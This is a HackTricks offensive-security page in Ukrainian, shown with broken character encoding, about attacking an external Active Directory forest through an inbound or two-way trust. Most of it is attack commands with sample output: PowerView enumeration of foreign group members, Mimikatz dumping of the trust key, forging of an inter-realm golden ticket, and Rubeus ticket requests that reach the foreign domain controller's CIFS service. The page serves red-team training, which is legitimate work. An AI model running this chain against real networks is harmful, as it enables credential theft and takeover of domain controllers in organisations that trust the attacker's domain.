# –ó–æ–≤–Ω—ñ—à–Ω—ñ–π –ª—ñ—Å–æ–≤–∏–π –¥–æ–º–µ–Ω - –û–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ–π (–≤—Ö—ñ–¥–Ω–∏–π) –∞–±–æ –¥–≤–æ—Å—Ç–æ—Ä–æ–Ω–Ω—ñ–π

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∑–æ–≤–Ω—ñ—à–Ω—ñ–π –¥–æ–º–µ–Ω –¥–æ–≤—ñ—Ä—è—î –≤–∞–º (–∞–±–æ –æ–±–∏–¥–≤–∞ –¥–æ–≤—ñ—Ä—è—é—Ç—å –æ–¥–∏–Ω –æ–¥–Ω–æ–º—É), —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–µ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ.

## –ü–µ—Ä–µ–ª—ñ–∫

–ü–æ-–ø–µ—Ä—à–µ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏** **–¥–æ–≤—ñ—Ä—É**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
–ü—ñ–¥ —á–∞—Å –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó –ø–µ—Ä–µ–ª—ñ–∫—É –±—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á **`crossuser`** –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –≥—Ä—É–ø—ñ **`External Admins`**, —è–∫–∞ –º–∞—î **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **DC –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –¥–æ–º–µ–Ω—É**.

## –ü–æ—á–∞—Ç–∫–æ–≤–∏–π –¥–æ—Å—Ç—É–ø

–Ø–∫—â–æ –≤–∏ **–Ω–µ –∑–º–æ–≥–ª–∏** –∑–Ω–∞–π—Ç–∏ –∂–æ–¥–Ω–æ–≥–æ **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ** –¥–æ—Å—Ç—É–ø—É –≤–∞—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —ñ–Ω—à–æ–º—É –¥–æ–º–µ–Ω—ñ, –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –º–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—ó AD —Ç–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø—ñ–¥–Ω—è—Ç—Ç—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤—ñ–¥ –Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ç–∞–∫—ñ —Ä–µ—á—ñ, —è–∫ kerberoasting):

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó **Powerview** –¥–ª—è **–ø–µ—Ä–µ–ª—ñ–∫—É** **—ñ–Ω—à–æ–≥–æ –¥–æ–º–µ–Ω—É**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `-Domain`, —è–∫ —É:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## –Ü–º—ñ—Ç–∞—Ü—ñ—è

### –í—Ö—ñ–¥ –≤ —Å–∏—Å—Ç–µ–º—É

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∑–≤–∏—á–∞–π–Ω–∏–π –º–µ—Ç–æ–¥ –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –º–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –¥–æ–º–µ–Ω—É, –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —ñ—Å—Ç–æ—Ä—ñ—î—é SID

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ [**—ñ—Å—Ç–æ—Ä—ñ—î—é SID**](sid-history-injection.md) —á–µ—Ä–µ–∑ –¥–æ–≤—ñ—Ä—É –º—ñ–∂ –ª—ñ—Å–∞–º–∏.

–Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á **–ø–µ—Ä–µ–º—ñ—â–µ–Ω–∏–π –∑ –æ–¥–Ω–æ–≥–æ –ª—ñ—Å—É –≤ —ñ–Ω—à–∏–π** —ñ **—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è SID –Ω–µ —É–≤—ñ–º–∫–Ω–µ–Ω–∞**, —Å—Ç–∞—î –º–æ–∂–ª–∏–≤–∏–º **–¥–æ–¥–∞—Ç–∏ SID –∑ —ñ–Ω—à–æ–≥–æ –ª—ñ—Å—É**, —ñ —Ü–µ–π **SID** –±—É–¥–µ **–¥–æ–¥–∞–Ω–∏–π** –¥–æ **—Ç–æ–∫–µ–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –ø—Ä–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó **—á–µ—Ä–µ–∑ –¥–æ–≤—ñ—Ä—É**.

{% hint style="warning" %}
–ù–∞–≥–∞–¥—É—î–º–æ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

–í–∏ –º–æ–∂–µ—Ç–µ **–ø—ñ–¥–ø–∏—Å–∞—Ç–∏** –∫–ª—é—á **–¥–æ–≤—ñ—Ä–∏** **TGT, –ø—ñ–¥—Ä–æ–±–ª—è—é—á–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –¥–æ–º–µ–Ω—É.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### –ü–æ–≤–Ω–∏–π —à–ª—è—Ö —ñ–º–ø–µ—Ä—Å–æ–Ω–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –ß–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤–∏ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
